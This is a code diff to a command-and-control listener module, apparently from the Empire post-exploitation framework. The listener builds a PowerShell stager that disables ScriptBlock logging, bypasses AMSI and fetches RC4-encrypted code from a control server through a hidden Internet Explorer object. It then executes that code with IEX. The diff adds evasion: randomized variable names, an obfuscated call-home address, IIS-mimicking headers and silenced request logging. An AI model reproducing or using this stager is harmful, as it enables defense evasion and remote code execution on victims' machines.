@@ -110,10 +110,10 @@ class Listener:
                 'Required'      :   True,
                 'Value'         :   'CF-RAY'
             },
-            'ServerVersion' : {
-                'Description'   :   'Server header for the control server.',
+            'Headers' : {
+                'Description'   :   'Headers for the control server.',
                 'Required'      :   True,
-                'Value'         :   'Microsoft-IIS/7.5'
+                'Value'         :   'Server:Microsoft-IIS/7.5'
             },
             'SlackToken' : {
                 'Description'   :   'Your SlackBot API token to communicate with your Slack instance.',
@@ -263,33 +263,33 @@ class Listener:
                     stager = helpers.randomize_capitalization("If($PSVersionTable.PSVersion.Major -ge 3){")
 
                     # ScriptBlock Logging bypass
-                    stager += helpers.randomize_capitalization("$GPF=[ref].Assembly.GetType(")
+                    stager += helpers.randomize_capitalization("$"+helpers.generate_random_script_var_name("GPF")+"=[ref].Assembly.GetType(")
                     stager += "'System.Management.Automation.Utils'"
                     stager += helpers.randomize_capitalization(").\"GetFie`ld\"(")
                     stager += "'cachedGroupPolicySettings','N'+'onPublic,Static'"
-                    stager += helpers.randomize_capitalization(");If($GPF){$GPC=$GPF.GetValue($null);If($GPC")
+                    stager += helpers.randomize_capitalization(");If($"+helpers.generate_random_script_var_name("GPF")+"){$"+helpers.generate_random_script_var_name("GPC")+"=$"+helpers.generate_random_script_var_name("GPF")+".GetValue($null);If($"+helpers.generate_random_script_var_name("GPC")+"")
                     stager += "['ScriptB'+'lockLogging']"
-                    stager += helpers.randomize_capitalization("){$GPC")
+                    stager += helpers.randomize_capitalization("){$"+helpers.generate_random_script_var_name("GPC")+"")
                     stager += "['ScriptB'+'lockLogging']['EnableScriptB'+'lockLogging']=0;"
-                    stager += helpers.randomize_capitalization("$GPC")
+                    stager += helpers.randomize_capitalization("$"+helpers.generate_random_script_var_name("GPC")+"")
                     stager += "['ScriptB'+'lockLogging']['EnableScriptBlockInvocationLogging']=0}"
-                    stager += helpers.randomize_capitalization("$val=[Collections.Generic.Dictionary[string,System.Object]]::new();$val.Add")
+                    stager += helpers.randomize_capitalization("$"+helpers.generate_random_script_var_name("val")+"=[Collections.Generic.Dictionary[string,System.Object]]::new();$"+helpers.generate_random_script_var_name("val")+".Add")
                     stager += "('EnableScriptB'+'lockLogging',0);"
-                    stager += helpers.randomize_capitalization("$val.Add")
+                    stager += helpers.randomize_capitalization("$"+helpers.generate_random_script_var_name("val")+".Add")
                     stager += "('EnableScriptBlockInvocationLogging',0);"
-                    stager += helpers.randomize_capitalization("$GPC")
+                    stager += helpers.randomize_capitalization("$"+helpers.generate_random_script_var_name("GPC")+"")
                     stager += "['HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\PowerShell\ScriptB'+'lockLogging']"
-                    stager += helpers.randomize_capitalization("=$val}")
+                    stager += helpers.randomize_capitalization("=$"+helpers.generate_random_script_var_name("val")+"}")
                     stager += helpers.randomize_capitalization("Else{[ScriptBlock].\"GetFie`ld\"(")
                     stager += "'signatures','N'+'onPublic,Static'"
                     stager += helpers.randomize_capitalization(").SetValue($null,(New-Object Collections.Generic.HashSet[string]))}")
 
                     # @mattifestation's AMSI bypass
-                    stager += helpers.randomize_capitalization("[Ref].Assembly.GetType(")
+                    stager += helpers.randomize_capitalization("$Ref=[Ref].Assembly.GetType(")
                     stager += "'System.Management.Automation.AmsiUtils'"
-                    stager += helpers.randomize_capitalization(')|?{$_}|%{$_.GetField(')
+                    stager += helpers.randomize_capitalization(');$Ref.GetField(')
                     stager += "'amsiInitFailed','NonPublic,Static'"
-                    stager += helpers.randomize_capitalization(").SetValue($null,$true)};")
+                    stager += helpers.randomize_capitalization(").SetValue($null,$true);")
                     stager += "};"
                     stager += helpers.randomize_capitalization("[System.Net.ServicePointManager]::Expect100Continue=0;")
 
@@ -307,18 +307,18 @@ class Listener:
                             host = 'http://' + '[' + str(bindIP) + ']' + ":" + str(port)
 
                 # code to turn the key string into a byte array
-                stager += helpers.randomize_capitalization("$K=[System.Text.Encoding]::ASCII.GetBytes(")
+                stager += helpers.randomize_capitalization("$"+helpers.generate_random_script_var_name("K")+"=[System.Text.Encoding]::ASCII.GetBytes(")
                 stager += "'%s');" % (stagingKey)
 
                 # this is the minimized RC4 stager code from rc4.ps1
-                stager += helpers.randomize_capitalization('$R={$D,$K=$Args;$S=0..255;0..255|%{$J=($J+$S[$_]+$K[$_%$K.Count])%256;$S[$_],$S[$J]=$S[$J],$S[$_]};$D|%{$I=($I+1)%256;$H=($H+$S[$I])%256;$S[$I],$S[$H]=$S[$H],$S[$I];$_-bxor$S[($S[$I]+$S[$H])%256]}};')
+                stager += helpers.randomize_capitalization('$R={$D,$'+helpers.generate_random_script_var_name("K")+'=$Args;$S=0..255;0..255|%{$J=($J+$S[$_]+$'+helpers.generate_random_script_var_name("K")+'[$_%$'+helpers.generate_random_script_var_name("K")+'.Count])%256;$S[$_],$S[$J]=$S[$J],$S[$_]};$D|%{$I=($I+1)%256;$H=($H+$S[$I])%256;$S[$I],$S[$H]=$S[$H],$S[$I];$_-bxor$S[($S[$I]+$S[$H])%256]}};')
 
                 # prebuild the request routing packet for the launcher
                 routingPacket = packets.build_routing_packet(stagingKey, sessionID='00000000', language='POWERSHELL', meta='STAGE0', additional='None', encData='')
                 b64RoutingPacket = base64.b64encode(routingPacket)
 
                 stager += "$ie=New-Object -COM InternetExplorer.Application;$ie.Silent=$True;$ie.visible=$False;$fl=14;"
-                stager += "$ser='%s';$t='%s';" % (host, stage0)
+                stager += "$ser="+helpers.obfuscate_call_home_address(host)+";$t='"+stage0+"';"
 
                 # add the RC4 packet to a header location
                 stager += "$c=\"%s: %s" % (requestHeader, b64RoutingPacket)
@@ -348,7 +348,7 @@ class Listener:
                 stager += helpers.randomize_capitalization("$iv=$data[0..3];$data=$data[4..$data.length];")
 
                 # decode everything and kick it over to IEX to kick off execution
-                stager += helpers.randomize_capitalization("-join[Char[]](& $R $data ($IV+$K))|IEX")
+                stager += helpers.randomize_capitalization("-join[Char[]](& $R $data ($IV+$"+helpers.generate_random_script_var_name("K")+")) | IEX")
 
                 if obfuscate:
                     stager = helpers.obfuscate(self.mainMenu.installPath, stager, obfuscationCommand=obfuscationCommand)
@@ -644,8 +644,11 @@ class Listener:
 
         @app.after_request
         def change_header(response):
-            "Modify the default server version in the response."
-            response.headers['Server'] = listenerOptions['ServerVersion']['Value']
+            "Modify the headers response server."
+            headers = listenerOptions['Headers']['Value']
+            for key in headers.split("|"):
+               value = key.split(":")
+               response.headers[value[0]] = value[1]
             return response
 
 
@@ -689,7 +692,7 @@ class Listener:
             listenerName = self.options['Name']['Value']
             message = "[*] GET request for {}/{} from {}".format(request.host, request_uri, clientIP)
             signal = json.dumps({
-                'print': True,
+                'print': False,
                 'message': message
             })
             dispatcher.send(signal, sender="listeners/http_com/{}".format(listenerName))
